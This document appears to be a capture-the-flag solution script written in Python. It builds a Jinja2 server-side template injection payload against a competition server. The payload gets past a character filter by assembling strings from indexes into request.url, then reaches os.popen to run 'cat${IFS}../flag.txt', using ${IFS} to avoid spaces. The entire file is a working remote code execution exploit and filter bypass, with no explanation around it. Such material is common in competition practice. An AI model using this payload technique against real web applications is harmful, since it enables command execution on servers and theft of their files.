from urllib.parse import quote
base_url = 'http://chal.pctf.competitivecyber.club:5555/'
char_storage = ''
indexes = {}
maxidx = len(base_url)
indexes['.'] = base_url.index('.')
indexes['/'] = base_url.index('/')
def get_string(s):
    global char_storage, indexes, maxidx
    seq = []
    for c in s:
        if c in indexes:
            seq.append(indexes[c])
        else:
            indexes[c] = maxidx 
            char_storage += c 
            seq.append(maxidx)
            maxidx += 1
    res = ''
    for i in range(len(seq)-1, 0-1, -1):
        if res == '':
            res = f'request.url.__getitem__({seq[i]})'
        else:
            res = f'request.url.__getitem__({seq[i]}).__add__(' + res + ')'
    return res
# no spaces are allowed in the filter
#cmd = 'ls'
cmd = 'cat${IFS}../flag.txt'
payload = f"{{{{request.application.__globals__.__getitem__({get_string('__builtins__')}).__getitem__({get_string('__import__')})({get_string('os')}).popen({get_string(cmd)}).read()}}}}"
print(base_url + quote(char_storage + '=' + payload)) # '=' is used to separate char_storage/the flag

